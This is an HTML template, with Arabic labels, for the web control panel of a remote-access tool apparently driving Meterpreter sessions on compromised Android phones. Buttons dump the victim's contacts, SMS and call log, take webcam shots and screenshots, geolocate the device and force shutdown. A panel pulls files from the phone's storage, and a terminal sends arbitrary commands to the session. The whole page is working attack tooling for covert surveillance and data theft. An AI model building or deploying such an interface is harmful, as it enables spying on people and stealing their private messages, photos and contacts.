<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HAMZA SKU - Session Control</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0e1a, #1a1e2e);
            color: #e0e6ed;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        h1 {
            color: #00ff88;
            font-size: 32px;
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
        }
        
        .btn-back {
            padding: 12px 25px;
            background: linear-gradient(135deg, #0088ff, #0066cc);
            color: white;
            text-decoration: none;
            border-radius: 10px;
            font-weight: bold;
            transition: all 0.3s;
        }
        
        .btn-back:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 136, 255, 0.4);
        }
        
        .grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .card {
            background: rgba(20, 24, 36, 0.95);
            border: 2px solid rgba(0, 255, 136, 0.3);
            border-radius: 20px;
            padding: 25px;
        }
        
        .card-title {
            color: #00ff88;
            font-size: 20px;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid rgba(0, 255, 136, 0.3);
        }
        
        .quick-actions {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 12px;
        }
        
        .quick-btn {
            padding: 15px 10px;
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.2), rgba(0, 204, 102, 0.2));
            border: 2px solid rgba(0, 255, 136, 0.3);
            border-radius: 10px;
            color: #00ff88;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 13px;
            text-align: center;
        }
        
        .quick-btn:hover {
            transform: translateY(-3px);
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.3), rgba(0, 204, 102, 0.3));
            border-color: #00ff88;
            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.3);
        }
        
        .quick-btn:active {
            transform: translateY(-1px);
        }
        
        .terminal-card {
            grid-column: 1 / -1;
        }
        
        .terminal {
            background: #000;
            border: 2px solid #00ff88;
            border-radius: 10px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            max-height: 500px;
            overflow-y: auto;
            margin-bottom: 15px;
        }
        
        .terminal::-webkit-scrollbar {
            width: 10px;
        }
        
        .terminal::-webkit-scrollbar-track {
            background: #000;
        }
        
        .terminal::-webkit-scrollbar-thumb {
            background: #00ff88;
            border-radius: 5px;
        }
        
        .terminal-output {
            color: #00ff88;
            white-space: pre-wrap;
            word-wrap: break-word;
            line-height: 1.6;
        }
        
        .terminal-prompt {
            color: #0088ff;
            margin-top: 10px;
        }
        
        .terminal-error {
            color: #ff0055;
        }
        
        .command-input {
            display: flex;
            gap: 10px;
        }
        
        .command-input input {
            flex: 1;
            padding: 12px 15px;
            background: #000;
            border: 2px solid #00ff88;
            border-radius: 10px;
            color: #00ff88;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        
        .command-input input:focus {
            outline: none;
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
        }
        
        .command-input button {
            padding: 12px 30px;
            background: linear-gradient(135deg, #00ff88, #00cc66);
            border: none;
            border-radius: 10px;
            color: #000;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .command-input button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.4);
        }
        
        .download-section {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 2px solid rgba(0, 255, 136, 0.3);
        }
        
        .download-input {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .download-input input {
            flex: 1;
            padding: 12px 15px;
            background: rgba(10, 14, 26, 0.8);
            border: 2px solid rgba(0, 255, 136, 0.3);
            border-radius: 10px;
            color: #e0e6ed;
            font-size: 14px;
        }
        
        .download-input input:focus {
            outline: none;
            border-color: #00ff88;
        }
        
        .download-input button {
            padding: 12px 25px;
            background: linear-gradient(135deg, #0088ff, #0066cc);
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .download-input button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 136, 255, 0.4);
        }
        
        .downloads-list {
            max-height: 200px;
            overflow-y: auto;
        }
        
        .download-item {
            padding: 10px;
            background: rgba(0, 136, 255, 0.1);
            border: 1px solid rgba(0, 136, 255, 0.3);
            border-radius: 8px;
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .download-item a {
            color: #0088ff;
            text-decoration: none;
            font-size: 13px;
        }
        
        .download-item a:hover {
            text-decoration: underline;
        }
        
        .info-section {
            background: rgba(0, 136, 255, 0.1);
            border: 1px solid rgba(0, 136, 255, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(0, 136, 255, 0.2);
        }
        
        .info-row:last-child {
            border-bottom: none;
        }
        
        .info-label {
            color: #8b95a8;
            font-size: 13px;
        }
        
        .info-value {
            color: #00ff88;
            font-weight: bold;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üíª Session Control - <span style="color: #0088ff;">#{{ session_id }}</span></h1>
            <a href="/dashboard" class="btn-back">‚Üê ÿßŸÑÿπŸàÿØÿ© ŸÑŸÑŸÄ Dashboard</a>
        </div>
        
        <div class="grid">
            <!-- Quick Actions -->
            <div class="card">
                <h2 class="card-title">‚ö° ÿ£ŸàÿßŸÖÿ± ÿ≥ÿ±Ÿäÿπÿ©</h2>
                <div class="quick-actions">
                    <button class="quick-btn" onclick="runQuick('sysinfo')">üíª System Info</button>
                    <button class="quick-btn" onclick="runQuick('getuid')">üë§ User ID</button>
                    <button class="quick-btn" onclick="runQuick('pwd')">üìÅ Current Dir</button>
                    <button class="quick-btn" onclick="runQuick('ls')">üìÇ List Files</button>
                    <button class="quick-btn" onclick="runQuick('ps')">‚öôÔ∏è Processes</button>
                    <button class="quick-btn" onclick="runQuick('ifconfig')">üåê Network</button>
                    <button class="quick-btn" onclick="runQuick('geolocate')">üìç Location</button>
                    <button class="quick-btn" onclick="runQuick('screenshot')">üì∏ Screenshot</button>
                    <button class="quick-btn" onclick="runQuick('webcam_snap')">üì∑ Webcam</button>
                    <button class="quick-btn" onclick="runQuick('dump_contacts')">üìû Contacts</button>
                    <button class="quick-btn" onclick="runQuick('dump_sms')">üí¨ SMS Messages</button>
                    <button class="quick-btn" onclick="runQuick('dump_calllog')">üì± Call Log</button>
                    <button class="quick-btn" onclick="runQuick('check_root')">üîì Check Root</button>
                    <button class="quick-btn" onclick="runQuick('app_list')">üì± Apps List</button>
                    <button class="quick-btn" onclick="runQuick('device_shutdown -f')">‚ö° Shutdown</button>
                    <button class="quick-btn" onclick="runQuick('interval -c 1')">üîÑ Keep Alive</button>
                </div>
            </div>
            
            <!-- File Download -->
            <div class="card">
                <h2 class="card-title">üì• ÿ™ÿ≠ŸÖŸäŸÑ ŸÖŸÑŸÅÿßÿ™</h2>
                
                <div class="info-section">
                    <div class="info-row">
                        <span class="info-label">Session:</span>
                        <span class="info-value">#{{ session_id }}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Status:</span>
                        <span class="info-value">üü¢ Active</span>
                    </div>
                </div>
                
                <div class="download-input">
                    <input type="text" id="file-path" placeholder="/sdcard/DCIM/photo.jpg" />
                    <button onclick="downloadFile()">üì• ÿ™ÿ≠ŸÖŸäŸÑ</button>
                </div>
                
                <div class="downloads-list" id="downloads-list">
                    <!-- Downloads will appear here -->
                </div>
            </div>
        </div>
        
        <!-- Terminal -->
        <div class="card terminal-card">
            <h2 class="card-title">üíª Terminal</h2>
            <div class="terminal">
                <div class="terminal-output" id="output">meterpreter > <span style="color: #8b95a8;">Waiting for commands...</span></div>
            </div>
            <div class="command-input">
                <input type="text" id="command" placeholder="ÿ£ÿØÿÆŸÑ ÿ£ŸÖÿ± Meterpreter..." onkeypress="if(event.key==='Enter') runCommand()">
                <button onclick="runCommand()">‚ñ∂ ÿ™ŸÜŸÅŸäÿ∞</button>
            </div>
        </div>
    </div>

    <script>
        const sessionId = '{{ session_id }}';
        const downloads = [];
        
        async function runCommand() {
            const input = document.getElementById('command');
            const cmd = input.value.trim();
            
            if (!cmd) return;
            
            addOutput(`meterpreter > ${cmd}`, 'prompt');
            input.value = '';
            
            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        session_id: sessionId,
                        command: cmd
                    })
                });
                
                const data = await res.json();
                
                if (data.success) {
                    addOutput(data.output, 'success');
                } else {
                    addOutput(`ERROR: ${data.output}`, 'error');
                }
            } catch (e) {
                addOutput(`ERROR: ${e}`, 'error');
            }
        }
        
        async function runQuick(cmd) {
            addOutput(`meterpreter > ${cmd}`, 'prompt');
            
            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        session_id: sessionId,
                        command: cmd
                    })
                });
                
                const data = await res.json();
                
                if (data.success) {
                    addOutput(data.output, 'success');
                } else {
                    addOutput(`ERROR: ${data.output}`, 'error');
                }
            } catch (e) {
                addOutput(`ERROR: ${e}`, 'error');
            }
        }
        
        async function downloadFile() {
            const path = document.getElementById('file-path').value.trim();
            
            if (!path) {
                alert('ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿØÿÆÿßŸÑ ŸÖÿ≥ÿßÿ± ÿßŸÑŸÖŸÑŸÅ');
                return;
            }
            
            addOutput(`meterpreter > download ${path}`, 'prompt');
            
            try {
                const res = await fetch('/api/download', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        session_id: sessionId,
                        file_path: path
                    })
                });
                
                const data = await res.json();
                
                if (data.success) {
                    addOutput(`‚úì File downloaded: ${data.local_path}`, 'success');
                    addDownloadLink(data.local_path, data.filename);
                    document.getElementById('file-path').value = '';
                } else {
                    addOutput(`ERROR: ${data.message}`, 'error');
                }
            } catch (e) {
                addOutput(`ERROR: ${e}`, 'error');
            }
        }
        
        function addOutput(text, type = 'normal') {
            const output = document.getElementById('output');
            
            if (output.textContent.includes('Waiting for commands')) {
                output.innerHTML = '';
            }
            
            const line = document.createElement('div');
            
            if (type === 'prompt') {
                line.className = 'terminal-prompt';
            } else if (type === 'error') {
                line.className = 'terminal-error';
            }
            
            line.textContent = text;
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
        }
        
        function addDownloadLink(localPath, filename) {
            const listEl = document.getElementById('downloads-list');
            const item = document.createElement('div');
            item.className = 'download-item';
            item.innerHTML = `
                <span>üìÑ ${filename || localPath.split('/').pop()}</span>
                <a href="/downloads/${localPath.split('/').pop()}" download>‚¨áÔ∏è ÿ™ÿ≠ŸÖŸäŸÑ</a>
            `;
            listEl.insertBefore(item, listEl.firstChild);
        }
        
        // Focus on command input
        document.getElementById('command').focus();
    </script>
</body>
</html>
